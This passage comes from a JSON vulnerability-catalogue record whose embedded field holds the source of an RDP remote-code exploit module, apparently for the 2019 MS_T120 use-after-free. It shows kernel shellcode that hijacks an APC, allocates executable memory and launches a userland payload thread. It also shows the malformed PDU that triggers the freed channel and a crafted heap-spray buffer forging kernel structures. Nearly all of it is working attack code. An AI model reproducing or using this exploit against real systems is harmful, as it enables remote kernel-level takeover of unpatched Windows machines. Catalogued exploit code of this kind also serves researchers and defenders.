NumberOfFunctions\n    mov ebx, dword [rax+32]  ; FunctionNames\n    add rbx, r15\n\n_get_proc_addr_get_next_func:\n    ; When we reach the start of the EAT (we search backwards), we hang or crash\n    dec ecx                     ; decrement NumberOfFunctions\n    mov esi, dword [rbx+rcx*4]  ; Get rva of next module name\n    add rsi, r15                ; Add the modules base address\n\n    call calc_hash\n\n    cmp eax, edi                        ; Compare the hashes\n    jnz _get_proc_addr_get_next_func    ; try the next function\n\n_get_proc_addr_finish:\n    pop rax                     ; restore EAT\n    mov ebx, dword [rax+36]\n    add rbx, r15                ; ordinate table virtual address\n    mov cx, word [rbx+rcx*2]    ; desired functions ordinal\n    mov ebx, dword [rax+28]     ; Get the function addresses table rva\n    add rbx, r15                ; Add the modules base address\n    mov eax, dword [rbx+rcx*4]  ; Get the desired functions RVA\n    add rax, r15                ; Add the modules base address to get the functions actual VA\n\n    pop rsi\n    pop rcx\n    pop rbx\n    ret\n\n;========================================================================\n; Calculate ASCII string hash. Useful for comparing ASCII string in shellcode.\n;\n; Argument: rsi = string to hash\n; Clobber: rsi\n; Return: eax = hash\n;========================================================================\ncalc_hash:\n    push rdx\n    xor eax, eax\n    cdq\n_calc_hash_loop:\n    lodsb                   ; Read in the next byte of the ASCII string\n    ror edx, 13             ; Rotate right our hash value\n    add edx, eax            ; Add the next byte of the string\n    test eax, eax           ; Stop when found NULL\n    jne _calc_hash_loop\n    xchg edx, eax\n    pop rdx\n    ret\n\n\n; KernelApcRoutine is called when IRQL is APC_LEVEL in (queued) Process context.\n; But the IRQL is simply raised from PASSIVE_LEVEL in KiCheckForKernelApcDelivery().\n; Moreover, there is no lock when calling KernelApcRoutine.\n; So KernelApcRoutine can simply lower the IRQL by setting cr8 register.\n;\n; VOID KernelApcRoutine(\n;           IN PKAPC Apc,\n;           IN PKNORMAL_ROUTINE *NormalRoutine,\n;           IN PVOID *NormalContext,\n;           IN PVOID *SystemArgument1,\n;           IN PVOID *SystemArgument2)\nkernel_kapc_routine:\n    push rbp\n    push rbx\n    push rdi\n    push rsi\n    push r15\n\n    mov rbp, [r8]       ; *NormalContext is our data area pointer\n\n    mov r15, [rbp+#{data_nt_kernel_addr_offset}]\n    push rdx\n    pop rsi     ; mov rsi, rdx\n    mov rbx, r9\n\n    ;======================================\n    ; ZwAllocateVirtualMemory(-1, &baseAddr, 0, &0x1000, 0x1000, 0x40)\n    ;======================================\n    xor eax, eax\n    mov cr8, rax    ; set IRQL to PASSIVE_LEVEL (ZwAllocateVirtualMemory() requires)\n    ; rdx is already address of baseAddr\n    mov [rdx], rax      ; baseAddr = 0\n    mov ecx, eax\n    not rcx             ; ProcessHandle = -1\n    mov r8, rax         ; ZeroBits\n    mov al, 0x40    ; eax = 0x40\n    push rax            ; PAGE_EXECUTE_READWRITE = 0x40\n    shl eax, 6      ; eax = 0x40 << 6 = 0x1000\n    push rax            ; MEM_COMMIT = 0x1000\n    ; reuse r9 for address of RegionSize\n    mov [r9], rax       ; RegionSize = 0x1000\n    sub rsp, 0x20   ; shadow stack\n    mov edi, #{zwallocatevirtualmemory_hash}\n    call win_api_direct\n    add rsp, 0x30\n\n    ; check error\n    test eax, eax\n    jnz _kernel_kapc_routine_exit\n\n    ;======================================\n    ; copy userland payload\n    ;======================================\n    mov rdi, [rsi]\n\n;--------------------------- HACK IN EGG USER ---------\n\n    push rdi\n\n    lea rsi, [rel shellcode_start]\n    mov rdi, 0x#{USERMODE_EGG.to_s(16)}\n\n  _find_user_egg_loop:\n      sub rsi, 0x#{CHUNK_SIZE.to_s(16)}\n      mov rax, [rsi - 8]\n      cmp rax, rdi\n      jnz _find_user_egg_loop\n\n  _inner_find_user_egg_loop:\n      inc rsi\n      mov rax, [rsi - 8]\n      cmp rax, rdi\n      jnz _inner_find_user_egg_loop\n\n    pop rdi\n;--------------------------- END HACK EGG USER ------------\n\n    mov ecx, 0x380  ; fix payload size to 0x380 bytes\n\n    rep movsb\n\n    ;======================================\n    ; find CreateThread address (in kernel32.dll)\n    ;======================================\n    mov rax, [rbp+#{data_peb_addr_offset}]\n    mov rax, [rax + 0x18]       ; PEB->Ldr\n    mov rax, [rax + 0x20]       ; InMemoryOrder list\n\n    ;lea rsi, [rcx + rdx]    ; rsi = ThreadListHead address\n    ;mov rbx, rsi    ; use rbx for iterating thread\n_find_kernel32_dll_loop:\n    mov rax, [rax]       ; first one always be executable\n    ; offset 0x38 (WORD)  => must be 0x40 (full name len c:\\windows\\system32\\kernel32.dll)\n    ; offset 0x48 (WORD)  => must be 0x18 (name len kernel32.dll)\n    ; offset 0x50  => is name\n    ; offset 0x20  => is dllbase\n    ;cmp word [rax+0x38], 0x40\n    ;jne _find_kernel32_dll_loop\n    cmp word [rax+0x48], 0x18\n    jne _find_kernel32_dll_loop\n\n    mov rdx, [rax+0x50]\n    ; check only \"32\" because name might be lowercase or uppercase\n    cmp dword [rdx+0xc], 0x00320033   ; 3\\x002\\x00\n    jnz _find_kernel32_dll_loop\n\n    mov r15, [rax+0x20]\n    mov edi, #{createthread_hash}\n    call get_proc_addr\n\n    ; save CreateThread address to SystemArgument1\n    mov [rbx], rax\n\n_kernel_kapc_routine_exit:\n    xor ecx, ecx\n    ; clear queueing kapc flag, allow other hijacked system call to run shellcode\n    mov byte [rbp+#{data_queueing_kapc_offset}], cl\n    ; restore IRQL to APC_LEVEL\n    mov cl, 1\n    mov cr8, rcx\n\n    pop r15\n    pop rsi\n    pop rdi\n    pop rbx\n    pop rbp\n    ret\n\nuserland_start_thread:\n    ; CreateThread(NULL, 0, &threadstart, NULL, 0, NULL)\n    xchg rdx, rax   ; rdx is CreateThread address passed from kernel\n    xor ecx, ecx    ; lpThreadAttributes = NULL\n    push rcx        ; lpThreadId = NULL\n    push rcx        ; dwCreationFlags = 0\n    mov r9, rcx     ; lpParameter = NULL\n    lea r8, [rel userland_payload]  ; lpStartAddr\n    mov edx, ecx    ; dwStackSize = 0\n    sub rsp, 0x20\n    call rax\n    add rsp, 0x30\n    ret\n\nuserland_payload:\n    ^\n\n    [\n      KERNELMODE_EGG,\n      assemble_with_fixups(asm)\n    ].pack('Q<a*')\n  end\n\n  def create_free_trigger(chan_user_id, chan_id)\n    # malformed Disconnect Provider Indication PDU (opcode: 0x2, total_size != 0x20)\n    vprint_status(\"Creating free trigger for user #{chan_user_id} on channel #{chan_id}\")\n    # The extra bytes on the end of the body is what causes the bad things to happen\n    body = \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\" + \"\\x00\" * 22\n    rdp_create_channel_msg(chan_user_id, chan_id, body, 3, 0xFFFFFFF)\n  end\n\n  def create_exploit_channel_buffer(target_addr)\n    overspray_addr = target_addr + 0x2000\n    shellcode_vtbl = target_addr + HEADER_SIZE\n    magic_value1 = overspray_addr + 0x810\n    magic_value2 = overspray_addr + 0x48\n    magic_value3 = overspray_addr + CHUNK_SIZE + HEADER_SIZE\n\n    # first 0x38 bytes are used by DATA PDU packet\n    # exploit channel starts at +0x38, which is +0x20 of an _ERESOURCE\n    # http://www.tssc.de/winint/Win10_17134_ntoskrnl/_ERESOURCE.htm\n    [\n      [\n        # SystemResourceList (2 pointers, each 8 bytes)\n        # Pointer to OWNER_ENTRY (8 bytes)\n        # ActiveCount (SHORT, 2 bytes)\n        # Flag (WORD, 2 bytes)\n        # Padding (BYTE[4], 4 bytes) x64 only\n        0x0, # SharedWaters (Pointer to KSEMAPHORE, 8 bytes)\n        0x0, # ExclusiveWaiters (Pointer to KSEVENT, 8 bytes)\n        magic_value2, # OwnerThread (ULONG, 8 bytes)\n        magic_value2, # TableSize (ULONG, 8 bytes)\n        0x0, # ActiveEntries (DWORD, 4 bytes)\n        0x0, # ContenttionCount (DWORD, 4 bytes)\n        0x0, # NumberOfSharedWaiters (DWORD, 4 bytes)\n        0x0, # NumberOfExclusiveWaiters (DWORD, 4 bytes)\n        0x0, # Reserved2 (PVOID, 8 bytes) x64 only\n        magic_value2, # Address (PVOID, 8 bytes)\n        0x0, # SpinLock (UINT_PTR, 8 bytes)\n      ].pack('Q<Q<Q<Q<L<L<L<L<Q<Q<Q<'),\n      [\n        magic_value2, # SystemResourceList (2 pointers, each 8 bytes)\n        magic_value2, # --------------------\n        0x0, # Pointer to OWNER_ENTRY (8 bytes)\n        0x0, # ActiveCount (SHORT, 2 bytes)\n        0x0, # Flag (WORD, 2 bytes)\n        0x0, # Padding (BYTE[4], 4 bytes) x64 only\n        0x0, # SharedWaters (Pointer to KSEMAPHORE, 8 bytes)\n        0x0, # ExclusiveWaiters (Pointer to KSEVENT, 8 bytes)\n        magic_value2, # OwnerThread (ULONG, 8 bytes)\n        magic_value2, # TableSize (ULONG, 8 bytes)\n        0x0, # ActiveEntries (DWORD, 4 bytes)\n        0x0, # ContenttionCount (DWORD, 4 bytes)\n        0x0, # NumberOfSharedWaiters (DWORD, 4 bytes)\n        0x0, # NumberOfExclusiveWaiters (DWORD, 4 bytes)\n        0x0, # Reserved2 (PVOID, 8 bytes) x64 only\n        magic_value2, # Address (PVOID, 8 bytes)\n        0x0, # SpinLock (UINT_PTR, 8 bytes)\n      ].pack('Q<Q<Q<S<S<L<Q<Q<Q<Q<L<L<L<L<Q<Q<Q<'),\n      [\n        0x1F, # ClassOffset (DWORD, 4 bytes)\n        0x0, # bindStatus (DWORD, 4 bytes)\n        0x72, # lockCount1 (QWORD, 8 bytes)\n        magic_value3, # connection (QWORD, 8 bytes)\n        shellcode_vtbl, # shellcode vtbl ? (QWORD, 8 bytes)\n        0x5, # channelClass (DWORD, 4 bytes)\n        \"MS_T120\\x00\".encode('ASCII'), # channelName (BYTE[8], 8 bytes)\n        0x1F, # channelIndex (DWORD, 4 bytes)\n        magic_value1, # channels (QWORD, 8 bytes)\n        magic_value1, # connChannelsAddr (POINTER, 8 bytes)\n        magic_value1, # list1 (QWORD, 8 bytes)\n        magic_value1, # list1 (QWORD, 8 bytes)\n        magic_value1, # list2 (QWORD, 8 bytes)\n        magic_value1, # list2 (QWORD, 8 bytes)\n        0x65756c62, # inputBufferLen (DWORD, 4 bytes)\n        0x7065656b, # inputBufferLen (DWORD, 4 bytes)\n        magic_value1, # connResrouce (QWORD, 8 bytes)\n        0x65756c62, # lockCount158 (DWORD, 4 bytes)\n        0x7065656b, # dword15C (DWORD, 4 bytes)\n      ].pack('L<L<Q<Q<Q<L<a*L<Q<Q<Q<Q<Q<Q<L<L<Q<L<L<')\n    ].join('')\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2019-05-14",
    "x_mitre_platforms": [
        "win'"
    ]
}